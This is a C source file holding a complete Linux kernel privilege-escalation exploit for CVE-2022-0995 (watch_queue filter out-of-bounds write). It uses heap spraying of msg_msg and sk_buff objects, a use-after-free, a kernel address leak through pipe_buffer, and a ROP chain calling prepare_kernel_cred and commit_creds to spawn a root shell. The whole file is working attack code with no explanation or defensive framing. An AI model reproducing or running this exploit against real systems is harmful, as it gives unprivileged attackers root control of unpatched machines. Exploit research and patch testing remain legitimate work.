#define _GNU_SOURCE
#include <string.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <assert.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/watch_queue.h>

unsigned long user_cs,user_ss,user_sp,user_rflags;
void hexdump(unsigned char* buf, int size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0)
            printf("%04x: ", i);
        printf("%02x ", buf[i]);
        if (i % 16 == 15)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

void err(const char* format, ...) {
    if (!format) {
        exit(-1);
    }
    fprintf(stderr, "%s", "\033[1;31m[!]\033[0m ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void info(const char* format, ...) {
    if (!format) {
        return;
    }
    fprintf(stderr, "%s", "\033[1;31m[*]\033[0m ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void save_state(void)
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    info("State saved.");
}

void get_shell() {
    if(getuid()) {
        err("Failed to get root shell");
    }
    info("Success! Pop root shell");
    system("/bin/sh");
}

#define PRIMARY_SIZE 0x60
#define SECONDARY_SIZE 0x400
#define M_TYPE_FAKE 0x1337
#define M_TYPE_PRIMARY 0x41
#define M_TYPE_SECONDARY 0x42
#define NUM_MSGQID 4096
#define MSG_TAG 0xAAAAAAAA
#define NUM_SKBUFF 128
#define NUM_SOCKET 16
#define NUM_PIPEFD 256
#define PAGE_SIZE 0x1000
#define SKB_SHARED_SIZE 0x140
#define ANON_PIPE_BUF_OPS 0x123e140
// gadgets
#define PUSH_RSI_JUMP_RSI_39 0x72ee7c
#define POP_RSP_RET 0x4fe74
#define POP_RDI_RET 0xffffffff810475ed - 0xffffffff81000000
#define ADD_RSP_POP_POP_RET 0xffffffff8175dc05 - 0xffffffff81000000 //0xffffffff81bf0df1 - 0xffffffff81000000 // add 0x38, rsp; pop r12 ; pop rbp; ret
#define PREPARE_KERNEL_CREDS 0xca3e0
#define COMMIT_CREDS 0xc9f00
#define MOV_RDI_RAX_POP_POP_RET  0xffffffff81029f61- 0xffffffff81000000
#define SWAPGS_RESTORSE_REGS_RET_TO_USER 0xffffffff81e00fc6 - 0xffffffff81000000//0xffffffff81e00fc6 - 0xffffffff81000000

struct msg_msg{
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg{
    uint64_t next;
};

struct pipe_buffer{
    uint64_t page;
    uint32_t offset, len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t priv;
};

struct pipe_buffer_operations{
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct {
    long mtype;
    char mtext[PRIMARY_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct {
    long mtype;
    char mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

struct {
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

int msgqid[NUM_MSGQID];
int ss[NUM_SOCKET][2];
int pipefd[NUM_PIPEFD][2];
uint64_t kern_base;
uint64_t kernel_leak;

void set_cpu() {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &my_set) == -1) {
        perror("sched_setaffinity()");
        exit(1);
    }
    info("Set to specific core");
}

void build_rop(char* buf) {
    uint64_t *rop;
    *(uint64_t *)&buf[0x39] = kern_base + POP_RSP_RET;
    *(uint64_t *)&buf[0x0] = kern_base + ADD_RSP_POP_POP_RET;
    rop = (uint64_t *)&buf[0xa8];

    int k = 0;
    rop[k++] = 0xdeadbeef; // rbx
    rop[k++] = (uint64_t)get_shell; // rbp
    rop[k++] = kern_base + POP_RDI_RET;
    rop[k++] = 0;
    rop[k++] = kern_base + PREPARE_KERNEL_CREDS;
    rop[k++] = kern_base + MOV_RDI_RAX_POP_POP_RET;
    rop[k++] = 0xdeadbeef;
    rop[k++] = 0xdeadbeef;
    rop[k++] = kern_base + COMMIT_CREDS;
    rop[k++] = kern_base + SWAPGS_RESTORSE_REGS_RET_TO_USER;
    rop[k++] = 0xdeadbeef;
    rop[k++] = 0xdeadbeef;
    rop[k++] = (uint64_t) get_shell;
    rop[k++] = user_cs;
    rop[k++] = user_rflags;
    rop[k++] = user_sp & 0xffffffffffffff00;
    rop[k++] = user_ss;
}

void build_msg(struct msg_msg* msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = M_TYPE_FAKE;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = 0;
}


ssize_t send_msg(int msgid, const void* msgp, size_t msg_sz, int msgtyp) {
    *(long*)msgp = msgtyp;
    if (msgsnd(msgid, msgp, msg_sz - sizeof(long), 0) < 0) {
        return -1;
    }
    return 0;
}

int read_msg(int msgid, void* msgp, size_t msg_sz, int msgtyp) {
    if (msgrcv(msgid, msgp, msg_sz - sizeof(long), msgtyp, 0) < 0) {
        return -1;
    }
    return 0;
}

int peek_msg(int msgid, void* msgp, size_t msg_sz, int msgtyp) {
    if (msgrcv(msgid, msgp, msg_sz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        return -1;
    }
    return 0;
}

int spray_skbuff(int ss[NUM_SOCKET][2], const void* buf, size_t size) {
    for (int i = 0; i < NUM_SOCKET; i++) {
        for (int j = 0; j < NUM_SKBUFF; j++) {
            ssize_t res = write(ss[i][0], buf, size);
            if (res < 0) {
                err("Failed to spray skbuff");
            }
        }
    }
    return 0;
}

int free_skbuff(int ss[NUM_SOCKET][2], void* buf, size_t size) {
    for (int i = 0; i < NUM_SOCKET; i++) {
        for (int j = 0; j < NUM_SKBUFF; j++) {
            ssize_t res = read(ss[i][1], buf, size);
            if (res < 0) {
                err("Failed to free skbuff");
            }
        }
    }
    return 0;
}

void trigger_out_of_bound(int fd[2]) {
    struct watch_notification_filter* watch_filter;
    unsigned int nrfilter = 4;

    watch_filter = (struct watch_notification_filter*)calloc(1, sizeof(struct watch_notification_filter) + nrfilter * sizeof(struct watch_notification_type_filter));
    if(!watch_filter) {
        err("Calloc failed");
    }

    watch_filter->nr_filters = nrfilter;

    for (int i = 0; i < nrfilter - 1; i++) {
        watch_filter->filters[i].type = 1;
    }
    watch_filter->filters[nrfilter - 1].type = 0x30a; // since we control the size of the allocated chunk, we chose 4
    if (ioctl(fd[0], IOC_WATCH_QUEUE_SET_FILTER, watch_filter) < 0) {
        err("Failed to call ioctl");
    }
    free(watch_filter);
    info("OOB triggered");
}

int main() {

    int pipe_fd[2];
    info("CVE-2022-0995");
    set_cpu();
    save_state();

    if (pipe2(pipe_fd, O_NOTIFICATION_PIPE) < 0) {
        err("Failed to create pipe");
    }

    // int s = socket(AF_UNIX, SOCK_STREAM, 0);

    // if (s < 0) {
    //     err("Fail to setup socket");
    // }

    for (int i = 0; i < NUM_SOCKET; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
            err("Fail to setup socket pair");
        }
    }

    for(int i = 0; i < NUM_MSGQID; i++) {
        msgqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if(msgqid[i] < 0) {
            err("Failed to create queue");
            goto err_mid;
        }
    }
    info("Create %d queue", NUM_MSGQID);

    info("Spraying primary message");
    for(int i = 0; i < NUM_MSGQID; i++) {
        memset(&primary_msg, 0x0, sizeof(primary_msg));
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if(send_msg(msgqid[i], &primary_msg, sizeof(primary_msg), M_TYPE_PRIMARY) < 0) {
            goto err_mid;
        }
    }

    info("Spraying secondary messsage");
    for(int i = 0; i < NUM_MSGQID; i++) {
        memset(&secondary_msg, 0x0, sizeof(secondary_msg));
        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if(send_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg), M_TYPE_SECONDARY) < 0) {
            goto err_mid;
        }
    }

    info("Create holes in message to later construct UAF");
    for(int i = 0; i < NUM_MSGQID; i += 1024) {
        if(read_msg(msgqid[i], &primary_msg, sizeof(primary_msg), M_TYPE_PRIMARY) < 0) {
            goto err_mid;
        }
    }
    /*      we need to release at least 2 message for the allocation of the watch_filter to work since the `memdup_user` will also allocate one chunk, then the wfilter allocation will also do that
     *
     *
     */
    // we will now trigger the bug and check if we got the message corruption
    int victim_qid = -1;
    int real_qid = -1;
    info("Trigger out of bound bug and check if we create the message overlapping or not");
    trigger_out_of_bound(pipe_fd);
    for(int i = 0; i < NUM_MSGQID; i++) {
        if(i % 1024 == 0) {
            continue;
        }
        if (peek_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0) {
            err("failed to peek");
            goto err_mid;
        }

        if (*(int *)&secondary_msg.mtext[0] != MSG_TAG) {
            err("Failed msg_tag");
            goto err_mid;
        }

        if(*(int *)&secondary_msg.mtext[4] != i) {
            victim_qid = i;
            real_qid = *(int *)&secondary_msg.mtext[4];
            break;
        }
    }

    if(victim_qid < 0) {
        info("Can't overlap");
        goto err_mid;
    }

    //  from now we will release 2 message, that will cause UAF

    info("real_qid: 0x%lx", real_qid);
    info("victim_qid: 0x%lx", victim_qid);

    info("Freeing secondary message to construct UAF");
    if (read_msg(msgqid[real_qid], &secondary_msg, sizeof(secondary_msg), M_TYPE_SECONDARY) < 0) {
        info("msgrcv");
        goto err_mid;
    }

    info("Spraying fake secondary message");
    char fake_secondary_msg[704];
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));

    build_msg((struct msg_msg*)fake_secondary_msg, 0x41414141, 0x42424242, PAGE_SIZE - sizeof(struct msg_msg), 0);

    if (spray_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to spray sk_buff");
        goto err_mid;
    }

    info("OOB read from victim msg_msg");

    if (peek_msg(msgqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0) {
        err("Failed to receive victim msg_msg");
        goto err_mid;
    }

    if (*(int *)&oob_msg.mtext[SECONDARY_SIZE] != MSG_TAG) {
        err("Failed to reclaim UAF object");
        goto err_mid;
    }

    struct msg_msg* msg =(struct msg_msg *)&oob_msg.mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
    info("Primary message: 0x%lx", msg->m_list_prev);

    if (free_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to free sk_buff");
        goto err_mid;
    }

    build_msg((struct msg_msg *)fake_secondary_msg, 0x41414141, 0x42424242, sizeof(oob_msg.mtext), msg->m_list_prev - 8);

    if (spray_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to spray sk_buff");
        goto err_mid;
    }

    info("Arbitrary read using oob_msg");

    if (peek_msg(msgqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0) {
        err("Failed to read victim message");
        goto err_mid;
    }

    if (*(int *)&oob_msg.mtext[PAGE_SIZE] != MSG_TAG) {
        err("Failed to reclaim UAF object");
        goto err_mid;
    }

    msg = (struct msg_msg *)&oob_msg.mtext[PAGE_SIZE - sizeof(struct msg_msg)];
    uint64_t victim_addr = msg->m_list_next - 0x400;

    info("UAF object addr: 0x%lx", victim_addr);

    info("Now we spray pipe_buffer to leak kernel address");

    if (free_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to free sk_buff");
        goto err_mid;
    }

    memset(fake_secondary_msg, 0x0, sizeof(fake_secondary_msg));

    build_msg((struct msg_msg *) fake_secondary_msg, victim_addr + 0x800, victim_addr + 0x800, SECONDARY_SIZE - sizeof(struct msg_msg), 0); // valid heap address for next and prev
    if (spray_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to spray sk_buff");
        goto err_mid;
    }

    if (read_msg(msgqid[victim_qid], &secondary_msg, sizeof(secondary_msg), M_TYPE_FAKE) < 0) {
        err("Failed to received secondary message");
        goto err_mid;
    }

    info("pipe_buffer spraying...");
    for (int i = 0; i < NUM_PIPEFD; i++) {
        if (pipe(pipefd[i])) {
            err("Failed to create pipe");
            goto err_mid;
        }
        ssize_t res = write(pipefd[i][1], "AAAABBBB", 8);
        if (res < 0) {
            err("Failed to write to pipe");
            goto err_mid;
        }
    }

    info("Free sk_buff to read pipe_buffer");
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));

    struct pipe_buffer* pipe_buf = (struct pipe_buffer *)&fake_secondary_msg;

    for (int i = 0; i < NUM_SOCKET; i++) {
        for (int j = 0; j < NUM_SKBUFF ; j++) {

            ssize_t res = read(ss[i][1], &fake_secondary_msg, sizeof(fake_secondary_msg));
            if (res < 0) {
                err("Failed to release sk_buff");
                goto err_mid;
            }
            if (pipe_buf->ops > 0x1337) {
                kernel_leak = pipe_buf->ops;
                info("anon_pipe_buf_ops: 0x%lx", kernel_leak);
            }
        }
    }

    kern_base = kernel_leak - ANON_PIPE_BUF_OPS;

    info("Kernel base: 0x%lx", kern_base);

    info("Now we hijack the ops of pipe_buffer, gain code execution");
    pipe_buf = (struct pipe_buffer *)fake_secondary_msg;

    pipe_buf->ops = victim_addr + 0x290;
    struct pipe_buffer_operations* ops_ptr = (struct pipe_buffer_operations *)(fake_secondary_msg + 0x290);
    ops_ptr->release = kern_base + PUSH_RSI_JUMP_RSI_39;

    build_rop(fake_secondary_msg);

    info("Spraying sk_buff to hijack pipe_buffer");

    if (spray_skbuff(ss, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        err("Failed to spray sk_buff");
        goto err_mid;
    }

    info("Trigger fake ops->release to execute ROP chain");

    for (int i = 0; i < NUM_PIPEFD; i++) {
        close(pipefd[i][0]);
        close(pipefd[i][1]);
    }

err_mid: // clean up message
    info("If you reach here then run again");
    for (int i = 0; i < NUM_MSGQID; i++) {
        if (i == victim_qid) {
            continue;
        }
        if (msgctl(msgqid[i], IPC_RMID, NULL) < 0) {
            err("msgctl");
            exit(0);
        }
    }
}



